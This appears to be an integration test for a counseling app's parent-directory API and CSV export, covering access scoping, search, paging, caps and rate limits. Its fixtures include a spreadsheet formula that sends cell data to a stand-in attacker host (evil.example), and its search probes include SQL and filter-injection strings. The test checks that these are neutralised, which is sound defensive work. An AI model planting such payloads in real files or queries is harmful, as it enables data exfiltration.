// The parents directory: GET /guardians/roster and /guardians/roster.csv.
// Read-only and derived from the student records, so what must hold is WHO sees
// WHICH parents (a counselor's own caseload, nobody else's, and never by
// guessing an id in the search box), that only the listed fields leave, that the
// CSV can't carry a formula, and the limits. A shared (collaborator) student's
// parents are the one judgement call: RLS lets the collaborator read the parent
// rows but not the student's profile, so the list can't name the student and
// leaves them out, counted in `sharedNotShown` (see routes/guardians.ts).
import { API, CLIENT, call, check, sql, user } from "./harness.mjs";
import { firmWith, q, studentOf } from "./imports-helpers.mjs";

const tag = Date.now().toString(36);
const today = new Date().toISOString().slice(0, 10);

const raw = async (token, path) => {
  const r = await fetch(API + path, { headers: { ...CLIENT, ...(token ? { Authorization: `Bearer ${token}` } : {}) } });
  const buf = Buffer.from(await r.arrayBuffer());
  return { status: r.status, headers: r.headers, buf, text: buf.toString("utf8") };
};

/** One record per line of RFC 4180 text (quoted cells may hold commas, quotes and line breaks). */
function parseCsv(text) {
  const rows = [];
  let row = [];
  let cur = "";
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        cur += '"';
        i++;
      } else if (ch === '"') quoted = false;
      else cur += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ",") {
      row.push(cur);
      cur = "";
    } else if (ch === "\r" && text[i + 1] === "\n") {
      row.push(cur);
      rows.push(row);
      row = [];
      cur = "";
      i++;
    } else cur += ch;
  }
  if (cur !== "" || row.length) {
    row.push(cur);
    rows.push(row);
  }
  return rows;
}

async function setStudent(student, name, classYear, archived = false) {
  await sql(`update public.profiles set full_name = '${q(name)}', grad_year = ${classYear ? `'${classYear}'` : "null"}, archived_at = ${archived ? "now()" : "null"} where id = '${student.id}'`);
}

const lit = (v) => (v === null || v === undefined ? "null" : `'${q(v)}'`);
async function addGuardian(student, { name, email = null, phone = null, relationship = null, alerts = true, reports = true }) {
  return sql(`with g as (insert into public.guardians (student_id, full_name, email, phone, relationship, alerts_enabled, receives_reports)
    values ('${student.id}', '${q(name)}', ${lit(email)}, ${lit(phone)}, ${lit(relationship)}, ${alerts}, ${reports}) returning id) select id from g`);
}

const EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
// addedByStudent: 20261122000001 (false here: these rows are written as postgres, so nobody is recorded as adding them).
// parentAccount: 20261123000002 (the row's Invite to Meridies state; absent on a database without it).
const ALLOWED_KEYS = ["addedByStudent", "classYear", "email", "id", "name", "parentAccount", "phone", "receivesAlerts", "receivesReports", "relationship", "studentId", "studentName"];

// ---- people ------------------------------------------------------------------------
const a = await user("gr-a");
const b = await user("gr-b");
const s1 = await studentOf(a, "gr-s1");
const s2 = await studentOf(a, "gr-s2");
const s3 = await studentOf(a, "gr-s3-archived");
const sb = await studentOf(b, "gr-sb");
const shared = await studentOf(b, "gr-shared");
await setStudent(s1, "Maya Lee", "2027");
await setStudent(s2, "Noor Adams", "2028");
await setStudent(s3, "Ola Zimmer", "2025", true);
await setStudent(sb, "Zed Elsewhere", "2027");
await setStudent(shared, "Sharon Shared", "2027");
await sql(`insert into public.student_collaborators (student_id, counselor_id, access) values ('${shared.id}', '${a.id}', 'read')`);

const ann = await addGuardian(s1, { name: "Ann Lee", relationship: "mother", email: `ann-${tag}@example.com`, phone: "+1 555 010 0001" });
const bo = await addGuardian(s1, { name: "Bo Lee", relationship: "father", email: `bo-${tag}@example.com`, alerts: false, reports: false });
const zara = await addGuardian(s2, { name: "Zara Adams", phone: "555-0102" });
const evil = await addGuardian(s2, { name: EVIL, relationship: "@SUM(1+1)", email: "=cmd@example.com", phone: "555-0103" });
const zed = await addGuardian(s3, { name: "Zed Zimmer", email: `zed-${tag}@example.com` });
const other = await addGuardian(sb, { name: "Otto Elsewhere", email: `otto-${tag}@example.com`, phone: "555-0199" });
const sharedParent = await addGuardian(shared, { name: "Sharon's Parent", email: `sp-${tag}@example.com` });

// ---- who may call ------------------------------------------------------------------
const pending = await user("gr-pending", "counselor", { approved: false });
const noToken = await raw(null, "/guardians/roster");
check("no token is 401", noToken.status === 401, String(noToken.status));
const noTokenCsv = await raw(null, "/guardians/roster.csv");
check("no token is 401 for the CSV too", noTokenCsv.status === 401, String(noTokenCsv.status));
const asStudent = await call(s1.token, "GET", "/guardians/roster");
check("a student is 403", asStudent.status === 403, String(asStudent.status));
const asStudentCsv = await raw(s1.token, "/guardians/roster.csv");
check("a student is 403 for the CSV too", asStudentCsv.status === 403, String(asStudentCsv.status));
const asPending = await call(pending.token, "GET", "/guardians/roster");
check("a pending counselor is 403 account_pending", asPending.status === 403 && asPending.body?.code === "account_pending", JSON.stringify(asPending.body));
const asPendingCsv = await raw(pending.token, "/guardians/roster.csv");
check("a pending counselor is 403 for the CSV too", asPendingCsv.status === 403 && JSON.parse(asPendingCsv.text).code === "account_pending", asPendingCsv.text.slice(0, 120));

// ---- the caseload ------------------------------------------------------------------
const list = await call(a.token, "GET", "/guardians/roster");
check("a counselor reads the directory (200)", list.status === 200, JSON.stringify(list.body).slice(0, 200));
const rows = list.body?.guardians ?? [];
const names = rows.map((r) => r.name);
check("it lists their own students' parents, ordered by the student's surname, then the parent's name", JSON.stringify(names) === JSON.stringify([EVIL, "Zara Adams", "Ann Lee", "Bo Lee"]), JSON.stringify(names));
check("total counts them", list.body?.total === 4 && list.body?.nextCursor === null, JSON.stringify({ t: list.body?.total, n: list.body?.nextCursor }));
check("another practice's parent never appears", !JSON.stringify(list.body).includes("Otto Elsewhere") && !JSON.stringify(list.body).includes(`otto-${tag}`));
check("an archived student's parent is left out by default", !names.includes("Zed Zimmer"));
check("a shared student's parent is left out (no student to name) and counted", !names.includes("Sharon's Parent") && list.body?.sharedNotShown === 1, String(list.body?.sharedNotShown));
const annRow = rows.find((r) => r.id === ann);
check(
  "a row is exactly the listed fields",
  annRow && JSON.stringify(Object.keys(annRow).sort()) === JSON.stringify(ALLOWED_KEYS.filter((k) => k !== "parentAccount" || "parentAccount" in annRow)) &&
    (!("parentAccount" in annRow) || JSON.stringify(Object.keys(annRow.parentAccount).sort()) === JSON.stringify(["delivery", "expiresAt", "invitedAt", "state"])) &&
    annRow.name === "Ann Lee" && annRow.relationship === "mother" && annRow.email === `ann-${tag}@example.com` && annRow.phone === "+1 555 010 0001" &&
    annRow.studentId === s1.id && annRow.studentName === "Maya Lee" && annRow.classYear === "2027" && annRow.receivesAlerts === true && annRow.receivesReports === true,
  JSON.stringify(annRow)
);
const boRow = rows.find((r) => r.id === bo);
check("alerts and reports off read as false", boRow?.receivesAlerts === false && boRow?.receivesReports === false && boRow?.phone === null, JSON.stringify(boRow));
const zaraRow = rows.find((r) => r.id === zara);
check("a parent with only a phone has a null email", zaraRow?.email === null && zaraRow?.phone === "555-0102", JSON.stringify(zaraRow));
check("no student email or sign-in detail leaves", !JSON.stringify(list.body).includes(s1.email) && !JSON.stringify(list.body).includes(s2.email));
check("the directory is not cached", (await raw(a.token, "/guardians/roster")).headers.get("cache-control") === "no-store");

const fromB = await call(b.token, "GET", "/guardians/roster");
check("the other counselor sees their own and the shared student's parents", fromB.status === 200 && JSON.stringify((fromB.body?.guardians ?? []).map((r) => r.name).sort()) === JSON.stringify(["Otto Elsewhere", "Sharon's Parent"]) && fromB.body?.sharedNotShown === 0, JSON.stringify(fromB.body).slice(0, 300));

// ---- archived, class year ----------------------------------------------------------
const withArchived = await call(a.token, "GET", "/guardians/roster?includeArchived=true");
check("includeArchived=true adds the archived student's parent, last by surname", withArchived.status === 200 && withArchived.body?.total === 5 && withArchived.body.guardians[4]?.id === zed, JSON.stringify((withArchived.body?.guardians ?? []).map((r) => r.name)));
const y2027 = await call(a.token, "GET", "/guardians/roster?classYear=2027");
check("classYear narrows to that class", y2027.status === 200 && y2027.body?.total === 2 && y2027.body.guardians.every((r) => r.classYear === "2027"), JSON.stringify(y2027.body).slice(0, 200));
const y2025 = await call(a.token, "GET", "/guardians/roster?classYear=2025");
check("an archived class stays hidden until asked for", y2025.status === 200 && y2025.body?.total === 0);
const y2025b = await call(a.token, "GET", "/guardians/roster?classYear=2025&includeArchived=true");
check("…and shows with includeArchived", y2025b.status === 200 && y2025b.body?.total === 1 && y2025b.body.guardians[0].id === zed);

// ---- search ------------------------------------------------------------------------
const search = async (qs) => (await call(a.token, "GET", `/guardians/roster?q=${encodeURIComponent(qs)}`)).body;
const byName = await search("ann lee");
check("q finds a parent by name", byName?.total === 1 && byName.guardians[0].id === ann, JSON.stringify(byName));
const byEmail = await search(`BO-${tag}@`);
check("q finds a parent by email, any case", byEmail?.total === 1 && byEmail.guardians[0].id === bo, JSON.stringify(byEmail));
const byStudent = await search("maya");
check("q finds a student's parents by the student's name", byStudent?.total === 2 && byStudent.guardians.every((r) => r.studentId === s1.id), JSON.stringify(byStudent));
for (const [label, probe] of [
  ["another practice's parent id", other],
  ["another practice's student id", sb.id],
  ["another practice's parent by name", "Otto Elsewhere"],
  ["another practice's parent by email", `otto-${tag}@example.com`],
  ["another practice's student by name", "Zed Elsewhere"],
  ["a shared student's parent by name", "Sharon's Parent"],
  ["a shared student's parent id", sharedParent],
  ["a shared student's name", "Sharon Shared"],
  ["one of their own parents' ids", ann],
  ["one of their own students' ids", s1.id],
  ["a phone number", "555-0102"],
]) {
  const r = await search(probe);
  check(`q can't reach ${label}`, r?.total === 0 && (r?.guardians ?? []).length === 0, JSON.stringify(r).slice(0, 200));
}

// ---- paging and bad input ----------------------------------------------------------
const seen = [];
let cursor = null;
let pages = 0;
for (;;) {
  const p = await call(a.token, "GET", `/guardians/roster?limit=3&includeArchived=true${cursor ? `&cursor=${encodeURIComponent(cursor)}` : ""}`);
  if (p.status !== 200) {
    check("a page answers", false, JSON.stringify(p.body));
    break;
  }
  seen.push(...p.body.guardians.map((r) => r.id));
  pages++;
  if (!p.body.nextCursor || pages > 5) break;
  cursor = p.body.nextCursor;
}
check("cursor paging walks every parent once, in order", pages === 2 && JSON.stringify(seen) === JSON.stringify(withArchived.body.guardians.map((r) => r.id)), `${pages} pages ${JSON.stringify(seen)}`);
const off = await call(a.token, "GET", "/guardians/roster?limit=2&offset=2");
check("offset paging starts where asked", off.status === 200 && off.body?.guardians.map((r) => r.id).join() === [ann, bo].join() && off.body?.total === 4 && off.body?.nextCursor === null, JSON.stringify(off.body).slice(0, 200));
for (const [label, qs] of [
  ["limit 0", "limit=0"],
  ["limit 501", "limit=501"],
  ["limit abc", "limit=abc"],
  ["a q over 100 characters", `q=${"x".repeat(101)}`],
  ["includeArchived=maybe", "includeArchived=maybe"],
  ["a cursor and an offset together", "cursor=abc&offset=1"],
  ["a cursor that isn't ours", "cursor=not-a-real-cursor"],
  ["a negative offset", "offset=-1"],
]) {
  const r = await call(a.token, "GET", `/guardians/roster?${qs}`);
  check(`${label} is 400`, r.status === 400, String(r.status));
}
const max = await call(a.token, "GET", "/guardians/roster?limit=500");
check("limit 500 is allowed", max.status === 200);

// ---- a firm: colleagues see only their own caseload --------------------------------
const f1 = await user("gr-f1");
const f2 = await user("gr-f2");
await firmWith(f1, [f2]);
const fs1 = await studentOf(f1, "gr-fs1");
const fs2 = await studentOf(f2, "gr-fs2");
await setStudent(fs1, "Fiona Owner", "2027");
await setStudent(fs2, "Felix Member", "2027");
await addGuardian(fs1, { name: "Owner's Parent", email: `fo-${tag}@example.com` });
await addGuardian(fs2, { name: "Member's Parent", email: `fm-${tag}@example.com` });
const o = await call(f1.token, "GET", "/guardians/roster");
const m = await call(f2.token, "GET", "/guardians/roster");
check("a firm owner sees only their own students' parents", o.status === 200 && JSON.stringify(o.body.guardians.map((r) => r.name)) === JSON.stringify(["Owner's Parent"]) && o.body.sharedNotShown === 0, JSON.stringify(o.body).slice(0, 200));
check("a firm member sees only their own students' parents", m.status === 200 && JSON.stringify(m.body.guardians.map((r) => r.name)) === JSON.stringify(["Member's Parent"]) && m.body.sharedNotShown === 0, JSON.stringify(m.body).slice(0, 200));
const oSearch = await call(f1.token, "GET", `/guardians/roster?q=${encodeURIComponent("Member's Parent")}`);
check("…and can't search into a colleague's", oSearch.status === 200 && oSearch.body.total === 0);

// ---- the CSV -----------------------------------------------------------------------
const csv = await raw(a.token, "/guardians/roster.csv");
check("CSV answers 200 as text/csv; charset=utf-8", csv.status === 200 && csv.headers.get("content-type") === "text/csv; charset=utf-8", `${csv.status} ${csv.headers.get("content-type")}`);
check("CSV is an attachment named for today's UTC date", csv.headers.get("content-disposition") === `attachment; filename="meridies-parents-${today}.csv"`, csv.headers.get("content-disposition"));
check("CSV is not cached", csv.headers.get("cache-control") === "no-store", csv.headers.get("cache-control"));
check("CSV carries the shared-student count the list returns, in X-Shared-Not-Shown", csv.headers.get("x-shared-not-shown") === "1", String(csv.headers.get("x-shared-not-shown")));
const fCsv = await raw(f1.token, "/guardians/roster.csv");
check("…and 0 when nothing is shared with the caller", fCsv.status === 200 && fCsv.headers.get("x-shared-not-shown") === "0", `${fCsv.status} ${fCsv.headers.get("x-shared-not-shown")}`);
check("CSV has no byte-order mark", csv.buf[0] !== 0xef && csv.text.charCodeAt(0) !== 0xfeff);
check("CSV lines end CRLF, never a bare line feed", csv.text.endsWith("\r\n") && !/(?<!\r)\n/.test(csv.text));
const table = parseCsv(csv.text);
check("CSV has the header row", JSON.stringify(table[0]) === JSON.stringify(["Parent or guardian", "Relationship", "Email", "Phone", "Student", "Class year", "Gets alerts", "Gets reports"]), JSON.stringify(table[0]));
check("CSV has one line per parent, in the same order as the list", table.length === 5 && table.slice(1).map((r) => r[0]).join("|") === [`'${EVIL}`, "Zara Adams", "Ann Lee", "Bo Lee"].join("|"), JSON.stringify(table.map((r) => r[0])));
const evilLine = table[1];
check("a formula in a name, relationship or email is neutralised", evilLine[0] === `'${EVIL}` && evilLine[1] === "'@SUM(1+1)" && evilLine[2] === "'=cmd@example.com", JSON.stringify(evilLine));
check("no cell of the CSV starts as a formula", table.every((r) => r.every((c) => !/^[=+\-@\t\r]/.test(c))), "a cell starts with a formula character");
check("CSV rows carry the same fields", table[3].join("|") === ["Ann Lee", "mother", `ann-${tag}@example.com`, "'+1 555 010 0001", "Maya Lee", "2027", "Yes", "Yes"].join("|") && table[4].join("|") === ["Bo Lee", "father", `bo-${tag}@example.com`, "", "Maya Lee", "2027", "No", "No"].join("|"), JSON.stringify(table.slice(3)));
check("CSV never has another practice's parent", !csv.text.includes("Otto") && !csv.text.includes("Sharon"));
const csvFiltered = await raw(a.token, `/guardians/roster.csv?q=${encodeURIComponent("lee")}&classYear=2027`);
check("CSV honours the same filters", csvFiltered.status === 200 && parseCsv(csvFiltered.text).length === 3, csvFiltered.text.slice(0, 200));
const csvArchived = await raw(a.token, "/guardians/roster.csv?includeArchived=true");
check("CSV honours includeArchived", csvArchived.status === 200 && parseCsv(csvArchived.text).length === 6);
const csvEmpty = await raw(a.token, "/guardians/roster.csv?q=nobodyhasthisname");
check("an empty CSV is just the header", csvEmpty.status === 200 && parseCsv(csvEmpty.text).length === 1);
const csvBad = await raw(a.token, "/guardians/roster.csv?includeArchived=maybe");
check("CSV with a bad filter is 400", csvBad.status === 400, String(csvBad.status));

// ---- q is a plain substring, never a filter ----------------------------------------
const qc = await user("gr-q");
const qs1 = await studentOf(qc, "gr-qs1");
await setStudent(qs1, "Quinn Query", "2027");
const joId = await addGuardian(qs1, { name: "Jo (Joanne) O'Neil, Sr.", email: `jo-${tag}@example.com` });
const patId = await addGuardian(qs1, { name: "Pat 100% Back\\Slash *Star*", email: `pat-${tag}@example.com` });
await addGuardian(qs1, { name: "Plain Parent", email: `plain-${tag}@example.com` });
const qSearch = async (term) => call(qc.token, "GET", `/guardians/roster?q=${encodeURIComponent(term)}`);
for (const term of ["x,id.neq.0", "id.neq.0", "or(id.eq.1)", "_", ".*", "a,b", "';--", "student_id.not.is.null", "x) or (id.neq.0"]) {
  const r = await qSearch(term);
  check(`q=${term} is a plain substring: 200, nothing matches`, r.status === 200 && r.body?.total === 0 && (r.body?.guardians ?? []).length === 0, `${r.status} ${JSON.stringify(r.body).slice(0, 160)}`);
}
for (const [term, id] of [["(", joId], [")", joId], ["(Joanne)", joId], ["o'neil, sr", joId], ["%", patId], ["*", patId], ["\\", patId], ["100%", patId]]) {
  const r = await qSearch(term);
  check(`q=${term} finds only the name that contains it`, r.status === 200 && r.body?.total === 1 && r.body.guardians[0].id === id, `${r.status} ${JSON.stringify(r.body).slice(0, 160)}`);
}
const qCsv = await raw(qc.token, `/guardians/roster.csv?q=${encodeURIComponent("x,id.neq.0")}`);
check("the CSV treats q the same way (header only, no error)", qCsv.status === 200 && parseCsv(qCsv.text).length === 1, `${qCsv.status} ${qCsv.text.slice(0, 120)}`);

// ---- a caseload past 250 students (the directory reads the roster itself) ----------
const big = await user("gr-big");
const stamp = `${tag}-big`;
await sql(`insert into auth.users (id, instance_id, aud, role, email, raw_user_meta_data, created_at, updated_at)
  select gen_random_uuid(), '00000000-0000-0000-0000-000000000000', 'authenticated', 'authenticated', 'grbig-' || g || '-${stamp}@test.local',
    jsonb_build_object('full_name', 'Big Student ' || lpad(g::text, 3, '0'), 'role', 'student'), now(), now()
  from generate_series(1, 251) g`);
await sql(`update public.profiles set counselor_id = '${big.id}', grad_year = case when full_name <= 'Big Student 010' then '2031' else '2030' end where email like 'grbig-%-${stamp}@test.local'`);
await sql(`insert into public.guardians (student_id, full_name, email)
  select p.id, 'Parent ' || lpad(n::text, 2, '0') || ' of ' || p.full_name, 'p' || n || '-' || substr(p.id::text, 1, 8) || '@example.com'
  from public.profiles p cross join generate_series(1, 21) n where p.counselor_id = '${big.id}'`);

// A student a colleague shared with this counselor: the fallback reads student_collaborators to count them, and
// their parents stay out of the list.
const bigShared = await studentOf(b, "gr-bigshared");
await setStudent(bigShared, "Bigshared Student", "2031");
const bigSharedParents = [
  await addGuardian(bigShared, { name: "Bigshared Parent One", email: `bsp1-${tag}@example.com` }),
  await addGuardian(bigShared, { name: "Bigshared Parent Two", email: `bsp2-${tag}@example.com` }),
];
await sql(`insert into public.student_collaborators (student_id, counselor_id, access) values ('${bigShared.id}', '${big.id}', 'read')`);

const bigSeen = new Set();
let bigShareCount = null;
let bigCursor = null;
let bigPages = 0;
let bigTotal = null;
let bigFirst = null;
for (;;) {
  const p = await call(big.token, "GET", `/guardians/roster?limit=500${bigCursor ? `&cursor=${encodeURIComponent(bigCursor)}` : ""}`);
  if (p.status !== 200) {
    check("a big caseload's page answers", false, `${p.status} ${JSON.stringify(p.body).slice(0, 200)}`);
    break;
  }
  bigTotal = p.body.total;
  bigShareCount ??= p.body.sharedNotShown;
  bigFirst ??= p.body.guardians[0];
  for (const r of p.body.guardians) bigSeen.add(r.id);
  bigPages++;
  if (!p.body.nextCursor || bigPages > 20) break;
  bigCursor = p.body.nextCursor;
}
check("a 251-student caseload lists every parent across pages (5,271) and none of anyone else's", bigTotal === 5271 && bigSeen.size === 5271 && bigPages === 11, `${bigTotal} ${bigSeen.size} ${bigPages}`);
check("…a shared student's parents are left out and counted (the fallback reads student_collaborators)", bigShareCount === 2 && bigSharedParents.every((id) => !bigSeen.has(id)), `sharedNotShown ${bigShareCount}`);
check("…ordered by the student's surname, then the parent", bigFirst?.studentName === "Big Student 001" && bigFirst?.name === "Parent 01 of Big Student 001", JSON.stringify(bigFirst));
const bigCsv = await raw(big.token, "/guardians/roster.csv");
const bigCsvBody = bigCsv.status === 413 ? JSON.parse(bigCsv.text) : null;
check("a CSV over 5,000 rows is 413 roster_too_large, and says why", bigCsv.status === 413 && bigCsvBody?.code === "roster_too_large" && /more than 5,000 parents/.test(bigCsvBody?.error ?? "") && !bigCsv.headers.get("content-disposition"), `${bigCsv.status} ${bigCsv.text.slice(0, 200)}`);
const bigCsvNarrow = await raw(big.token, "/guardians/roster.csv?classYear=2031");
check("…and a class year brings it under the cap (210 parents)", bigCsvNarrow.status === 200 && parseCsv(bigCsvNarrow.text).length === 211, `${bigCsvNarrow.status} ${parseCsv(bigCsvNarrow.text).length}`);
check("…its shared-student count rides in the header, and the shared parents aren't in the file", bigCsvNarrow.headers.get("x-shared-not-shown") === "2" && !bigCsvNarrow.text.includes("Bigshared"), String(bigCsvNarrow.headers.get("x-shared-not-shown")));
const bigOther = await call(big.token, "GET", `/guardians/roster?q=${encodeURIComponent("Otto Elsewhere")}`);
check("a big caseload can't search into another practice", bigOther.status === 200 && bigOther.body.total === 0);

// ---- past the 20,000-parent read cap (251 students x 81 parents = 20,331) ----------
await sql(`insert into public.guardians (student_id, full_name, email)
  select p.id, 'Parent ' || lpad(n::text, 2, '0') || ' of ' || p.full_name, 'p' || n || '-' || substr(p.id::text, 1, 8) || '@example.com'
  from public.profiles p cross join generate_series(22, 81) n where p.counselor_id = '${big.id}'`);
const hugeList = await call(big.token, "GET", "/guardians/roster?limit=500");
check(
  "a caseload over the read cap answers the list with 413 roster_too_large, in words that don't blame a 5,000-row download",
  hugeList.status === 413 && hugeList.body?.code === "roster_too_large" && !/5,000/.test(hugeList.body?.error ?? "") && /class year/.test(hugeList.body?.error ?? ""),
  `${hugeList.status} ${JSON.stringify(hugeList.body).slice(0, 200)}`
);
const hugeCsv = await raw(big.token, "/guardians/roster.csv");
check("…and the CSV too", hugeCsv.status === 413 && JSON.parse(hugeCsv.text).code === "roster_too_large" && !/5,000/.test(JSON.parse(hugeCsv.text).error ?? ""), `${hugeCsv.status} ${hugeCsv.text.slice(0, 160)}`);
const hugeNarrow = await call(big.token, "GET", "/guardians/roster?limit=500&classYear=2031");
check("a class year brings the list back under the cap (10 students x 81 parents)", hugeNarrow.status === 200 && hugeNarrow.body?.total === 810 && hugeNarrow.body?.sharedNotShown === 2, `${hugeNarrow.status} ${JSON.stringify(hugeNarrow.body).slice(0, 160)}`);

// ---- rate limits -------------------------------------------------------------------
const rl = await user("gr-rl");
let okCount = 0;
let firstLimited = 0;
for (let i = 1; i <= 61; i++) {
  const r = await call(rl.token, "GET", "/guardians/roster");
  if (r.status === 200) okCount++;
  else if (!firstLimited) firstLimited = i;
}
check("the directory allows 60 reads a minute, then 429", okCount === 60 && firstLimited === 61, `ok ${okCount}, first limited ${firstLimited}`);
const rlc = await user("gr-rlc");
let csvOk = 0;
let csvLimited = 0;
for (let i = 1; i <= 11; i++) {
  const r = await raw(rlc.token, "/guardians/roster.csv");
  if (r.status === 200) csvOk++;
  else if (r.status === 429 && !csvLimited) csvLimited = i;
}
check("the CSV allows 10 downloads an hour, then 429", csvOk === 10 && csvLimited === 11, `ok ${csvOk}, first limited ${csvLimited}`);
